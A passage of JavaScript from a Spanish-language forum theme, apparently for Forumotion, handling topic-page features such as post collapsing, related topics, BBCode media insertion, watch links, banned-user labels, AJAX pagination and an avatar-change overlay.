                                class: 'fullOn',
                                attributes: {
                                    onclick: 'ops.temas.main.fullview(this, \'400px\')'
                                },
                                style: {
                                    float: 'right',
                                    display: 'none'
                                },
                                childs: [{
                                    tag: 'i',
                                    class: 'fa fa-power-off',
                                    style: {
                                        color: 'rgba(0, 128, 0, 1)',
                                    }
                                }, {
                                    tag: 'text',
                                    text: 'Activar colapso'
                                }]
                            }]
                        });
                        if (a.clientHeight > 500) {
                            a.className += ' long_post';
                            a.style.height = '400px';
                            init.move(a, f, 'after', function () {
                                b = a.nextElementSibling;
                                c = init.g('.viewfull', b)[0];
                                d = init.g('.fullOn', b)[0];
                                g = init.g('.viewhide', b)[0];
                                h = init.g('.fullOff', b)[0];
                                '100%' === Cookies.get('c_so') && (init.hide(c), init.show(d, 'inherit'), init.show(g, 'inherit'), init.hide(h), a.style.height = '100%')
                            })
                        }
                    })
                },
                trafico: function () {
                    var e = ops.num_sub_section.match(/(\d+)/)[0],
                        i = location.pathname.match(/\/t(\d+)/)[1],
                        n = init.fixedEncodeURIComponent(document.title.replace(/^\s?\[[^\[\]]+\]\s?/g, '')),
                        a = init.g('.related')[0],
                        o = init.g('.trafico_a', a),
                        r = init.g('.olList')[0],
                        s = init.g('.olList')[1],
                        c = '2' != e,
                        l = 'En papelera, no disponible',
                        f = 'No disponible',
                        h = 'No hay temas relacionados',
                        p = 'No hay mensajes activos',
                        d = 'traffic_related_',
                        m = 'traffic_same_',
                        g = ops.dataStore.get(m + i),
                        u = ops.dataStore.get(d + i),
                        v = '.samecategory',
                        _ = '.related',
                        y = '/search?mode=searchbox&search_keywords=' + n + '&show_results=topics',
                        L = function (e, i, n) {
                            init.contiene(e.value, 'fa-spinner') ? t(f, h, n) : i.innerHTML = e.value
                        },
                        x = function () {
                            ops.prefijos();
                            setTimeout(function () {
                                ops.dataStore.set(d + i, s.innerHTML, 864e5)
                            }, 2e4)
                        },
                        t = function (t, e, i) {
                            var n = init.create('li', {
                                    childs: [{
                                        tag: 'a',
                                        class: 'trafico_a',
                                        attributes: {
                                            href: t,
                                            title: e
                                        },
                                        html: e
                }]
                                }),
                                c = init.g(i)[0],
                                a = init.g('.fa-spinner', c)[0] || c.lastChild,
                                b = 'I' == a.nodeName ? 'replaceWith' : 'append';
                            init.move(a, n, b)


                        };
                    g.value ? L(g, r, v) : c ? ops.xmlhRequest('', '/feed/?f=' + e, function (e) {
                        var n = e.responseXML,
                            a = 0,
                            o = n && init.g('item', n);
                        init.myarray(o, function (e) {
                            var n = init.g('title', e)[0].textContent,
                                o = init.g('link', e)[0].textContent,
                                r = o.match(/\/t(\d+)/)[1],
                                s = r != i;
                            s && 5 > a++ ? t(o, n, v) : 1 == e.length && !s && t('#', p, v)
                        });
                        x(m + i, r.innerHTML);
                    }) : t(l, f, v);
                    u.value ? L(u, s, _) : ops.xmlhRequest('', y, function (e) {
                        var n = e.responseXML,
                            a = init.g('.topictitle', n),
                            r = _,
                            c = 0;
                        a.length && (init.myarray(a, function (e) {
                            var n = e.textContent,
                                a = e.href.match(/(\w.+)(?=\?highlight)/g)[0];
                            e.href.match(/\/t(\d+)/)[1] != i && 5 > c++ && t(a, n, r)
                        }), x(d + i, s.innerHTML), !o.length && t(f, f, _))
                    })
                },
                mas: function () {
                    var t, a = init.g('.plusmenu')[0],
                        b = init.g('#plus_menu'),
                        c = init.g('.left-overview', b)[0],
                        e = init.g('a', c),
                        f = init.create('div', {
                            class: 'tip_info',
                            text: 'Da click y úsame'
                        }),
                        g = init.g('a', a)[0],
                        i = init.g('.left-overview', b)[1];
                    init.move(a, f, 'before');
                    init.borrar(i);
                    init.myarray(e, function (t) {
                        var id = t.href.match(/(?!\?|&)(?!search_)(id=)(\w+)/)[2];
                        t.className = id;
                        t.addEventListener('click', function (e) {
                            e.preventDefault();
                            ops.start_Ncontent('' + id + '', this);
                        }, false)
                    });
                    init.elem(g, {
                        textContent: '+',
                        title: 'Menú con opciones extras',
                        onclick: 'ops.mas_click(this);return false',
                    })
                },
                edited: function () {
                    var a = init.g('.edited');
                    init.myarray(a, function (i) {
                        if (i.innerHTML) {
                            if (i.innerHTML == '') {
                                init.borrar(i)
                            } else {
                                var h = i.textContent;
                                init.elem(i, {
                                    title: h,
                                    innerHTML: '<i class="fas fa-marker" aria-hidden="true"></i>'
                                })
                            }
                        }
                    })
                },
                preTm: function () {
                    ops.temas.editor.nuevoComentario();
                    ops.temas.main.button(ops.button_dom);
                    ops.temas.main.esf();
                    ops.logout && (ops.temas.main.setMod());
                    ops.temas.main.getter();
                    ops.temas.main.ban();
                    ops.temas.main.cambiarAvatarModal();
                    ops.temas.main.stars();
                    ops.temas.main.nivelReputacion();
                    ops.temas.main.edited();
                    ops.temas.main.ocultarprimerpost();
                    ops.temas.main.añadir.main();
                    !ops.soy_staff && init.hide(ops.modbar);
                    init.fadeIn(ops.maincontent, 100);
                    init.fadeIn(ops.topicactions[0], 200);
                    init.fadeIn(ops.topicactions[1], 200);
                    init.g('.Nuevo').length && ops.scroll.top(init.g('.Nuevo')[0], 300);
                },
                createimgur: function () {
                    var a = init.g('#imgur'),
                        H = '<p class="anun_pic"><img src="http://i.imgur.com/JC2m40bh.png">Selecciona las imagenes</p><br/><iframe id="frame_imgur" src="/h25-imgur" style="padding-bottom:0;border:none;margin-top: -8px; height: 243px;" frameborder="1" scrolling="si" width="100%"></iframe>';
                    init.g('iframe', a).length == 0 && (a.innerHTML = H)
                },
                youtube: function () {
                    var H = '<div class="dropdown youtube"><div><label>Youtube URL:</label><input class="url_youtube" placeholder="http://" type="text"></div><input class="button_youtube" value="Insertar" type="button"></div>';
                    init.g('#youtube').innerHTML = H;
                    init.g('.button_youtube')[0].onclick = function () {
                        var y = init.g('.url_youtube')[0].value.match(/(?:v=|v\/|embed\/|youtu.be\/)(.{11})/)[1];
                        init.g('.url_youtube')[0].value = '';
                        ops.textarea.value += '[youtube]' + y + '[/youtube]\n';
                        init.hide(ops.ze_newtab)
                    };
                },
                facebookVideo: function () {
                    var H = '<div class="facebook_video"><div><label>Facebook video URL:</label><input class="facebook_url" placeholder="http://" type="text"></div><input class="facebook_button" value="Insertar" type="button" style="margin-left: 5px; height: 20px; padding: 0 4px;"/></div>';
                    init.g('#facebook').innerHTML = H;
                    init.g('.facebook_button')[0].onclick = function () {
                        var a = init.g('.facebook_url')[0].value.match(/[^https\:\/\/www\.facebook\.com].*/g);
                        init.g('.facebook_url')[0].value = '';
                        ops.textarea.value += '[facebook_video]/' + a + '[/facebook_video]\n';
                        init.hide(ops.ze_newtab)
                    };
                },
                createbburl: function () {
                    var f, g, e = init.g('#url'),
                        html = init.create('fragment', {
                            childs: [{
                                tag: 'div',
                                class: 'dropdown insertlink',
                                childs: [{

                                    tag: 'label',
                                    text: 'URL'
                    }, {
                                    tag: 'input',
                                    attributes: {
                                        type: 'text',
                                        id: 'linksrc',
                                        placeholder: 'http://',
                                        value: ''
                                    },
                                    class: 'url'
                    }, {
                                    tag: 'div',
                                    childs: [{
                                        tag: 'label',
                                        text: 'Descripción (Opcional)',
                        }, {
                                        tag: 'input',
                                        attributes: {
                                            type: 'text',
                                            id: 'linktitle',
                                            value: ''
                                        }
                        }]
                }, {
                                    tag: 'input',
                                    class: 'button_url',
                                    attributes: {
                                        type: 'button',
                                        value: 'Insertar'
                                    }

                }]
                            }]
                        });
                    init.replaceHtml(html, e, function () {
                        var a = init.g('#linksrc'),
                            b = init.g('#linktitle'),
                            c = init.g('.button_url')[0],
                            d = ops.textarea;
                        c.addEventListener('click', function () {
                            f = a.value;
                            g = b.value;
                            console.log('debug url click');
                            if (init.contiene(f, 'http://') || init.contiene(f, 'https://') || init.contiene(f, 'www.')) {
                                if (g != '') {
                                    d.value += '[url=' + f + ']' + g + '[/url]';
                                    init.hide(e);
                                    d.focus()
                                } else {
                                    d.value += '[url]' + f + '[/url]';
                                    d.focus()
                                }
                            } else {
                                return false
                            }
                        }, false)
                    });
                },
                createSmilies: function () {
                    var e, c, d, b = init.g('#emoticons');
                    ops.indice.spin(init.g('#emoticons'), '#000', '32px', 'center center');
                    ops.xmlhRequest('', '/h6-smilies', function (a) {
                        c = a.responseXML;
                        d = init.g('#emoticons', c);
                        init.move(b.firstChild, d, 'replaceWith', function () {
                            e = init.g('img', b);
                            init.myarray(e, function (i) {
                                i.addEventListener('click', function () {
                                    ops.textarea.value += ' ' + this.alt;
                                    ops.textarea.focus();
                                }, false)
                            })
                        })
                    });
                },
                createawesome: function () {
                    var c, b = init.g('#awesome');
                   ops.indice.spin(b, '#000', '32px', 'center center');
                    ops.xmlhRequest('', '/h18-emoji', function (a) {
                        c = init.g('#content', a.responseXML);
                        init.move(b.firstChild, c, 'replaceWith');
                        var e = init.g('.car_esp');
                        init.myarray(e, function(i){
                            init.elem(i, {
                                title: i.textContent,
                                innerHTML: '&' + i.textContent,

                            });
                            i.addEventListener('click',function(){
                                 ops.textarea.value += ' [Cesp]' + this.title + '[/Cesp]';
                                ops.textarea.focus()
                            })
                        })

                    });
                },
                vigInit: function () {
                    var    e = init.g('a'),
                           b = init.g('.watchnowatch')[0];
                    init.myarray(e, function (t) {
                        var a = t.href,
                            c = /(\?unwatch=topic|\?watch=topic)/gi.test(a),
                            d = /\?watch=topic/gi.test(a);
                        c && init.elem(t, {
                            innerHTML: d ? ops.lang.watchBTN : ops.lang.unwatchBTN,
                            className: d ? 'tvig-tem' : 'tnvig-tem',
                            onclick: 'ops.temas.main.vigilar(this, this.href);return false',
                            title: d ? 'Seguir este tema' : 'Dejar de seguir este tema'
                        });
                        !d && _userdata.session_logged_in && (b.style.display = 'inline');
                    })
                },
                setWatch: function () {
                    var a, e = init.g('a'),
                           f = init.g('#url_a_t').href + '?watch=topic';
                    init.myarray(e, function (t) {
                         /\?watch=topic/gi.test(t.href) && ops.temas.main.vigilar(t, f);    
                    })
                },
                vigilar: function (c, d) {
                    var t = d,
                        a = c.innerHTML,
                        b = a == ops.lang.watchBTN;
                    ops.xmlhRequest('confirm=1', t, function (o) {
                        init.elem(c, {
                            innerHTML: b ? ops.lang.unwatchBTN : ops.lang.watchBTN,
                            href: document.location.pathname + (b ? '?unwatch=topic' : '?watch=topic'),
                            title: b ? 'Dejar de seguir este tema' : 'Seguir este tema'
                        });
                    })
                },
                ban: function () {
                    var t, e = init.g('.ban'),
                        f = ' El autor de este mensaje ha sido baneado del foro',
                        g = '<div class="wrapper alert"><div class="ribbon-wrapper-green alert"><div class="ribbon-green alert">Baneado</div></div><span class="ribbon-wrapper-green-text"><i class="fa fa-exclamation-triangle"></i>' + f + '</span></div>',
                        h = '<i class="fa fa-exclamation-triangle" style="margin-bottom: -3px; margin-top: 2px; color: yellow;"></i> Baneado',
                        i = 'Usuario baneado',
                        m = '<span class="rv rLv0"><i class="fa fa-thumbs-down" aria-hidden="true"></i> Baneado</span>',
                        n = '<span class="offline">Desconectado para siempre</span>';
                    init.myarray(e, function (t) {
                        var l, a = t.nextSibling,
                            b = init.g('strong', a),
                            c = init.g('.content', a),
                            d = init.g('.nombre-tema', a),
                            f = init.g('.vote', a),
                            j = init.g('.reputacion', a),
                            k = init.g('.isConect', a);
                        a.style.display = 'block';
                        a.className += ' baneado';
                        j[0].innerHTML = m;
                        k[0].innerHTML = n;
                        f.length && (init.borrar(f[0]));
                        init.myarray(b, function (l) {
                            init.elem(l, {
                                title: i,
                                onclick: 'return false'
                            })
                        });
                        init.insertar(c[0], g, 'prepend')
                        d[0].firstChild.innerHTML = h;
                    });
                },
                button: function (c) {
                    try {
                        var name, id, e = init.g(c);
                        init.myarray(e, function (t) {
                            var a = init.g('.postprofile', t)[0],
                                b = init.g('.perfil_a', t),
                                d = init.g('.profile_img', a),
                                f = init.g('.perfil_texto', a),
                                g = init.g('.i_icon_pm', t),
                                h = init.g('.estado_post', t)[0],
                                i = init.g('strong', t),
                                j = init.g('.f_a3', a),
                                k = init.g('img', a),
                                l = init.g('a', a),
                                m = init.g('.isConect', t),
                                n = init.g('.version', t)[0],
                                o = init.g('.navegador', t)[0],
                                p = f[8] ? f[8].firstChild : '',
                                q = f[9] ? f[9].textContent.match(/\S+/)[0].toLowerCase() : 'ninguno',
                                r = f[10] ? f[10].textContent.match(/\S+/)[0].toLowerCase() : 'ninguno',
                                s = f[0] ? (ops.perfil.main.portada.split(f[0].innerHTML).estado == null ? f[0].innerHTML : ops.perfil.main.portada.split(f[0].innerHTML).estado) : '',
                                u = init.g('.nick', a)[0].firstChild.href,
                                nick = init.g('.nick', a)[0].textContent,
                                mpbutton= init.g('.pbutton2', t)[0],
                                v = 'ops.temas.main.perfilmodal.dom(\'perfil\',this);return false',
                                w = init.elem('p', {
                                    className: 'mp',
                                    innerHTML: 'MP',
                                    style: {
                                        display: 'inline'
                                    }
                                }),
                                x = init.elem('a', {
                                    href: u + 'wall',
                                    innerHTML: '<p class="ir_muro">muro</p>'
                                });
                           b[0].firstChild && init.elem(b[0].firstChild, {
                                className: 'perfil',
                                innerHTML: 'Perfil',
                                onclick: v,
                            });
                           d[0].firstChild && init.elem(d[0].firstChild, {
                                className: 'perfil',
                                innerHTML: '<p style=" display:inline">Perfil</p>',
                                onclick: v,
                            });
                            mpbutton.innerHTML +=  ' a '+ nick;
                            g.length && (g[0].parentNode.setAttribute('onclick', 'ops.temas.editor.start(\'pm\', this);return false'));
                            g.length && (init.move(g[0], w, 'replaceWith'));
                            j.length && (init.move(j[0], x, 'append'));
                            h.innerHTML = s;
                            ops.temas.main.webbutton(k);
                            ops.temas.main.emailbutton(l);
                            ops.temas.main.strongbuttons(i, t);
                            ops.temas.main.gender(p, m, t);
                            ops.temas.main.versionBrowser(n, o, q, r)
                        });
                        ops.temas.main.me();
                        ops.temas.main.myButtons(c);
                        //c != '.zeditor-new' && ops.temas.like.setup();
                        ops.temas.likes.move();
                        ops.temas.likes.avatar();
                        ops.temas.likes.createAva();
                    } catch (e) {
                        console.error(e)

                    }
                },
                versionBrowser: function (a, b, c, d) {
                    var e = 'phpbb3' == c ? ops.lang.dom_phpbb3 : 'punbb' == c ? ops.lang.dom_punbb : 'phpbb2' == c ? ops.lang.dom_phpbb2 : 'invision' == c && ops.lang.dom_invision,
                        f = 'chrome' == d ? ops.lang.dom_chrome : 'firefox' == d ? ops.lang.dom_firefox : 'safari' == d ? ops.lang.dom_safari : 'opera' == d ? ops.lang.dom_opera : 'explorer' == d && ops.lang.dom_explorer;
                    init.elem(a, {
                        className: a.className + ' ' + c,
                        innerHTML: e != false ? e : 'Ninguno',
                        style: {
                            display: 'block'
                        }
                    });
                    init.elem(b, {
                        className: b.className + ' ' + d,
                        innerHTML:f != false ? f : 'Ninguno',
                        style: {
                            display: 'block'
                        }
                    });

                },
                gender: function (e, a, t) {
                    if (e) {
                        var n = /online/.test(t.className),
                            s = 'Masculino' == e.alt,
                            i = 'Femenino' == e.alt,
                            l = s ? 'o' : i ? 'a' : 'x',
                            c = s ? 'male' : i ? 'female' : 'none',
                            o = n ? 'Conectad' + l : 'Desconectad' + l,
                            m = n ? 'p_online' : 'offline',
                            f = init.create('fragment', {
                                childs: [{
                                    tag: 'span',
                                    'class': m,
                                    text: o
                                }]
                            });
                        t.classList.add(c);
                        a.length && init.replaceHtml(f, a[0])
                    }
                },
                strongbuttons: function (a, f) {
                    var d, e, b = init.create('i', {
                        class: 'fa fa-at'
                    });
                    init.myarray(a, function (i) {
                        g = init.closest(i, 'a');
                        if (g != null && /\u(\d+)/.test(g.href)) {
                            d = i.textContent.match(/\S+/g)[0];
                            e = f.className.match(/\d+/g)[1];
                            init.elem(i, {
                                title: 'Mencionar a ' + d,
                                onclick: 'ops.temas.main.tagged(this,\'' + e + '\');return false'
                            });
                            init.move(i, b, 'prepend');
                        }
                    })
                },
                emailbutton: function (a) {
                    var b = init.elem('p', {
                        className: 'email',
                        innerHTML: 'Email',
                        style: {
                            display: 'inline'
                        }
                    });
                    init.myarray(a, function (i) {
                        /\=email\&u/g.test(i.href) != false && (init.move(i.firstChild, b, 'replaceWith'));
                    })
                },
                webbutton: function (a) {
                    var b = init.elem('p', {
                        className: 'www',
                        innerHTML: 'web',
                        style: {
                            display: 'inline'
                        }
                    });
                    init.myarray(a, function (i) {
                        /\/icon_contact_www\.gif/g.test(i.src) != false && (init.move(i, b, 'replaceWith'));
                    })
                },
                me: function () {
                    var me = init.g('.nick');
                    init.myarray(me, function (t) {
                        var d = t.textContent;
                        d === ops.mi_nombre && (init.closest(t, '.post').className += ' me')
                    })
                },
                myButtons: function (c) {
                    var t, b = init.g(c),
                        len = b.length;
                    init.myarray(b, function (t) {
                        var u = init.g('.editar', t),
                            v = init.g('.delete', t),
                            w = init.g('.quote', t),
                            x = init.g('.post_wall', t),
                            y = init.g('.ip', t),
                            z = init.g('.buttons_zeditor', t);
                        ops.soy_user && ops.estoy_logueado ? t.classList.contains('me') || (u.length && init.borrar(u[0]), v.length && init.borrar(v[0]), y.length && init.borrar(y[0])) : ops.estoy_logueado || (u.length && init.borrar(u[0]), v.length && init.borrar(v[0]), w.length && init.borrar(w[0]), y.length && init.borrar(y[0]), x.length && init.borrar(x[0]), z.length && init.borrar(z[0]))
                    })
                },
                paginationAjax: function (c) {
                    var g, x, f, e, d,
                        a = init.g('#mainPosts'),
                        b = init.g('.paginatop')[0],
                        f = init.g('.post'),
                        h = init.last(f);
                    ops.back(ops.backAdd());
                    ops.xmlhRequest('', c.href, function (o) {
                        x = o.responseXML;
                        d = init.g('#mainPosts', x);
                        g = init.g('.paginatop', x)[0];
                        e = g.innerHTML;
                        a.innerHTML = init.BB.parse(d.innerHTML);
                        b.innerHTML = e;
                        setTimeout(function () {
                            ops.setupVar();
                            ops.temas.main.pagReApp();
                            ops.temas.main.movePag(g)
                        }, 500);
                    })
                },
                setPagAjax: function () {
                    var i, c, a = init.g('.Nuevo'),
                        b = init.g('.pagination');
                    a.length && ops.scroll.top(a[0], 300);
                    init.myarray(b, function (r) {
                        c = init.g('a', r);
                        init.myarray(c, function (i) {
                            /(\/t(\d+)p(\d+)|\/t(\d+))-(.+)/g.test(i.href) && (i.addEventListener('click', function (e) {
                                e.preventDefault();
                                ops.temas.main.paginationAjax(this);

                            }))
                        });
                    });
                },
                pagReApp: function () {
                    ops.temas.main.button('.post');
                    ops.prefijos();
                    ops.backClose();
                    ops.confirm();
                    ops.temas.main.ocultarprimerpost();
                    ops.temas.main.nivelReputacion();
                    ops.temas.main.vigInit();
                    ops.temas.main.youtubeTamaño();
                    ops.temas.main.youtubeEmbed();
                    ops.temas.main.imgauto();
                    ops.temas.main.panda();
                    ops.temas.main.copy();
                    ops.temas.main.getter();
                    ops.temas.main.pollA();
                    ops.temas.main.añadir.main();
                    ops.temas.main.edited();
                    ops.temas.main.colapso()
                },
                activarTags: function (a) {
                    var b = init.create('span', {
                        childs: [{
                            tag: 'div',
                            class: 'accion',
                            childs: [{
                                tag: 'fieldset',
                                class: 'fields1',
                                childs: [{
                                    tag: 'br'
                                }, {
                                    tag: 'label',
                                    text: 'Normal',
                                    childs: [{
                                        tag: 'input',
                                        attributes: {
                                            type: 'radio',
                                            name: 'topictype',
                                            value: '0'
                                        },
                                    }],
                                }, {
                                    tag: 'label',
                                    text: 'Sticky',
                                    childs: [{
                                        tag: 'input',
                                        attributes: {
                                            type: 'radio',
                                            name: 'topictype',
                                            value: '1'
                                        },
                                    }]
                                }, {
                                    tag: 'label',
                                    text: 'Anuncio',
                                    childs: [{
                                        tag: 'input',
                                        attributes: {
                                            type: 'radio',
                                            name: 'topictype',
                                            value: '2'
                                        },
                                    }]
                                }, {
                                    tag: 'lable',
                                    text: 'Anuncio global',
                                    childs: [{
                                        tag: 'input',
                                        attributes: {
                                            type: 'radio',
                                            name: 'topictype',
                                            value: '3',
                                        },
                                    }]
                                }, {
                                    tag: 'br'
                                }, {
                                    tag: 'button',
                                    class: 'enviar',
                                    style: {
                                        float: 'left'
                                    },
                                    attributes: {
                                        onclick: 'ops.temas.main.get_tags(this);return false',
                                    },
                                    text: 'enviar'
                                }]
                            }]
                        }]
                    });
                    ops.box(b, 'Publicar tema como:');
                },
                get_tags: function () {
                    ops.xmlhRequest('', ops.path_edit, function (e) {
                        var t = e.responseXML,
                            a = t.forms.post,
                            s = init.g('.accion'),
                            n = ops.topictype(init.g('input', s[0])),
                            i = {
                                p: ops.id_f_post,
                                mode: 'editpost',
                                subject: a.subject.value,
                                message: a.message.value,
                                edit_reason: '',
                                attach_sig: 1,
                                notify: 1,
                                post: 'Enviar',
                                topictype: n
                            };
                        ops.uri = i, ops.xmlhRequest(i, '/post', function () {
                            var e = 'Normal',
                                t = 'Sticky',
                                a = 'Anuncio',
                                s = 'Anuncio global',
                                i = 0 == n ? e : 1 == n ? t : 2 == n ? a : 3 == n && s;
                            ops.toolbar.notify.go('Estableciste este tema como ' + i, null, 'check', 'fas fa-exclamation-circle'), ops.backClose()
                        })
                    })
                },
                postnumber: function (a, b, c) {
                    ops.temas.editor.start('reply', a, b, c);
                    ops.textarea.value += '[post]' + ops.url_tema + '[/post]';
                },
                offset_post: function (j) {
                    var a = init.g('.long_post'),
                        b = init.g('.zeditor-message', j)[0].offsetHeight,
                        c = ops.editor.offsetHeight,
                        d = init.g('.corners-top', j)[0];
                    init.myarray(a, function (i) {
                        i.style.heigth = '100%'
                    });
                    ops.scroll.top(b > c ? ops.textarea : d, 200);
                },
                offset_download: function (e) {
                    var a = init.g('.descargar'),
                        c = init.g('.long_post'),
                        k = init.g('.no_code'),
                        m = init.g('.informacion_nuevo');
                    if (_userdata.user_posts > 5 && a.length) {
                        init.myarray(k, function (i) {
                            i.removeAttribute('style')
                        });
                        init.myarray(c, function (i) {
                            i.style.cssText += 'height:100%'
                        });
                        m.length && init.borrar(m);
                        ops.scroll.top(init.g('.texto-descarga')[0], 200);
                    } else {
                        ops.scroll.top(init.last(init.g('.estado')), 200);
                    }
                },
                guestMessage: function () {
                    var c, b, d = ops.p_Fi;
                    if (ops.num_sub_section == 'f14' && ops.num_sub_section != 'f13') {
                        b = init.create('div', {
                            class: 'guest-Message',
                            childs: [{
                                tag: 'strong',
                                text: 'Llena los datos que se te piden al abrir un tema',
                            }, {
                                tag: 'br'
                            }, {
                                tag: 'span',
                                text: 'Preferimos no cerrar soportes, pero si abandonas tu tema cuando se te mencione, 7 dias, se enviara a la papelera.'
                            }, {
                                tag: 'br'
                            }, {
                                tag: 'span',
                                text: 'Sean pacientes ante todo.'
                            }]
                        });
                        init.move(d[0], b, 'before');
                    }
                },
                esf: function () {
                    ops.temas.main.fb_w();
                    ops.temas.main.twt();
                    ops.temas.main.youtubeEmbed();
                    ops.temas.main.preTema();
                    ops.temas.main.guestMessage();
                    ops.logout ? (ops.temas.main.mas(), ops.temas.main.vigInit()) : (ops.temas.main.mnl());
                    ops.temas.main.imgauto();
                    ops.temas.main.youtubeTamaño();
                    ops.temas.main.panda();
                    ops.temas.main.copy();
                    ops.temas.main.sin_req();
                    ops.temas.main.poll();
                    ops.temas.main.temasCerrados();
                    ops.temas.main.movePag();
                    window.setTimeout(ops.temas.main.colapso, 200);
                },
                movePag: function (f) {
                    var a = init.g('.paginatop'),
                        b = init.last(init.g('.post')),
                        c = ops.logout ? init.g('.buttons_zeditor', b)[0] : b,
                        d = init.last(init.g('.post')).previousElementSibling,
                        e = !init.contiene(b, 'pag_bottom'),
                        h = d && init.contiene(d, 'pag_bottom'),
                        i = init.g('.pagination').length == 2,
                        j = ops.logout ? 'before' : 'append',
                        g = !b.classList.contains('zeditor-new') ? 'undefined' != typeof f ? f : a.length && a[0].cloneNode(true) : a.length && init.g('.pag_bottom')[0];
                    ((e && h) || (e && i) && g) && init.move(c, g, j, function () {
                        init.elem(g, {
                            className: 'pagination pag_bottom',
                            style: {
                                marginLeft: '2rem',
                                float: 'left',
                                marginTop: '-1px'
                            }
                        });
                        ops.temas.main.setPagAjax();
                    });
                },
                attach: function () {
                    ops.temas.main.movePag();
                    ops.temas.main.youtubeTamaño();
                    ops.temas.main.youtubeEmbed();
                    ops.temas.main.imgauto();
                    ops.confirm();
                    ops.temas.main.nivelReputacion(init.g('.zeditor-new'));
                    ops.prefijos();
                    ops.temas.main.panda();
                    ops.temas.main.copy();
                    ops.temas.main.getter();
                    ops.temas.main.pollA();
                    ops.backClose()
                },
                pollA: function () {
                    var a = init.g('#poll_ballot'),
                        b = init.g('.anun_votos'),
                        c = init.g('#boton_votar');
                    if (a) {
                        init.borrar(b[0]);
                        init.show(c)
                        setTimeout(function () {
                            ops.scroll.top('#poll_ballot', 300);
                        }, 1000)
                    };
                },
               // ============================================================
// 🔹 MOD: cambiarAvatarModal()
// ------------------------------------------------------------
// EN: Displays the “Change avatar” overlay when the user hovers
//     over their own avatar inside .postprofile.
// ES: Muestra el modal "Cambiar avatar" al pasar el cursor
//     sobre el propio avatar (solo si es el autor logueado).
//
// Compatibilidad:
// - Tu estructura HTML personalizada:
//   .postprofile > .f_a1 > .imgholder > figure > a[href="/u<ID>"] > img
// - No depende de .avatar-titulo (como antes).
// ============================================================

cambiarAvatarModal: function () {
  try {
    // Localiza el contenedor del avatar del usuario actual
    var avatarHolder = document.querySelector(
      '.postprofile .imgholder a[href="/u' + ops.mi_id + '"]'
    );

    if (!avatarHolder) {
      console.warn('[ops] No se encontró avatarHolder para el usuario ' + ops.mi_id);
      return;
    }

    // Imagen dentro del avatarHolder
    var avatarImg = avatarHolder.querySelector('img');
    if (!avatarImg) {
      console.warn('[ops] No se encontró imagen de avatar dentro de imgholder.');
      return;
    }

    // Evitar duplicación de overlay si ya existe
    if (document.getElementById('c_ava_a')) return;

    // Crea overlay al pasar el mouse
    avatarHolder.addEventListener('mouseenter', function () {
      if (document.getElementById('c_ava_a')) return;

      var overlay = init.create('div', {
        attributes: {
          id: 'c_ava_a',
          onmouseleave: 'init.borrar(this)'
        },
        style: {
          position: 'absolute',
          fontSize: '10px',
          zIndex: '10',
          cursor: 'pointer',
          background: 'rgba(9, 14, 17, 0.61)',
          top: avatarImg.offsetTop + 'px',
          left: avatarImg.offsetLeft + 'px',
          height: avatarImg.offsetHeight + 'px',
          width: avatarImg.offsetWidth + 'px',
          borderRadius: '100%',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          textAlign: 'center',
          transition: 'opacity .3s ease'
        },
        childs: [
          {
            tag: 'p',
            class: 'avatar_ajax',
            html: '<i class="fa fa-camera" aria-hidden="true"></i> Cambiar avatar',
            style: {
              color: '#fff',
              fontSize: '10px',
              textShadow: '0 1px rgb(0, 0, 0)',
              lineHeight: '1.4',
              maxWidth: '70%',
              pointerEvents: 'none'
            }
          }
        ]
      });

      // Inserta el overlay encima del avatar
      avatarHolder.style.position = 'relative';
      avatarHolder.appendChild(overlay);

      // Activar el cambio de avatar
      overlay.addEventListener('click', function () {
        overlay.remove();
        ops.cambiarAvatar();
      });
    });

  } catch (e) {
    console.error('[ops] Error en cambiarAvatarModal:', e);
  }
},

                startGoddies: function (e, t) {
                    switch (e) {
                        case 'portada':
                            var c = tm && init.g('.tema-info')[0],
                                mensaje = 'Debes introducir un link de imagen antes de enviar',
                                field = 'profile_field_13_3',
                                value = t.previousElementSibling.value,
                                name = ops.sinEspacios(ops.mi_nombre),
                                valor = function (x) {
                                    t.previousElementSibling.value = x
                                };
                            ops.feedFields(value, field, value, mensaje, function (e) {
                                Cookies.remove('banner_src_' + name);
                                Cookies.set('banner_src_' + name, value, {
                                    expires: 365
                                });
                                if (ops.cf_name == ops.mi_nombre) {
                                    init.elem(c, {
                                        style: {
                                            background: 'url(' + value + ')center center / 110% no-repeat',
                                        }
                                    });
                                    valor('');
                                }
                                ops.toolbar.notify.go('Se actualizó tu portada con éxito', null, 'check', 'fas fa-check-double');
                                ops.actividadFeed(ops.mi_nombre + ' actualizó su portada en los temas ', 'Historial');
                            });
                            break;
                        case 'color':
                            var a = init.g('.perfil_texto')[2],
                                b = init.g('#url_a_t'),
                                c = init.g('.author-titulo')[0],
                                d = init.g('.perfil_texto')[3].textContent,
                                e = init.g('#_colortitulo_input'),
                                f = 'color:' + e.value + '!important;text-shadow:' + d + ' !important',
                                g = 'Debes introducir un codigo hexadecimal de color \n ó rbg antes de enviar: ejemplo: rgb(0, 0, 0)',
                                field = 'profile_field_13_5';
                            ops.feedFields(e.value, field, e.value, g, function () {
                                if (ops.cf_name === ops.mi_nombre) {
                                    a.textContent = e.value;
                                    b.style.cssText = f;
                                    c.style.cssText = f;
                                    e.value = '';
                                    ops.toolbar.notify.go('Se actualizó el color de los títulos con éxito', null, 'check', 'fas fa-check-double')
                                } else {
                                    e.value = 'Se actualizó el color de los títulos';
                                }
                                ops.actividadFeed(ops.mi_nombre + ' actualizó el color de sus títulos ', 'Historial');
                            });
                            break;
                        case 'sombra':
                            var a = init.g('#_shadow_ajax_input'),
                                b = init.g('.perfil_texto')[3].textContent,
                                c = init.g('#url_a_t'),
                                d = init.g('.perfil_texto')[2].textContent,
                                e = 'Debes introducir un codigo CSS de text-shadow antes de enviar: ejemplo: 0 1px rgb(255, 255, 255)',
                                field = 'profile_field_13_4';
                            ops.feedFields(a.value, field, a.value, e, function () {
                                if (ops.cf_name === ops.mi_nombre) {
                                    b = a.value;
                                    c.style.cssText = 'text-shadow:' + a.value + '!important;color:' + d + ' !important';
                                    a.value = '';
                                    ops.toolbar.notify.go('La sombra se actualizo con éxito', null, 'check', 'fas fa-check-double')
                                } else {
                                    a.value = 'La sombra se actualizo con éxito'
                                }
                                ops.actividadFeed(ops.mi_nombre + ' agregó una sombra a sus portadas ', 'Historial')
                            });
                    }
                },
                noCode: function () {
                    setTimeout(function () {
                        var w = init.g('code'),
                            a = init.create('span', {
                                class: 'code_invitado',
                                style: {
                                    textAlign: 'center',
                                    display: 'block',
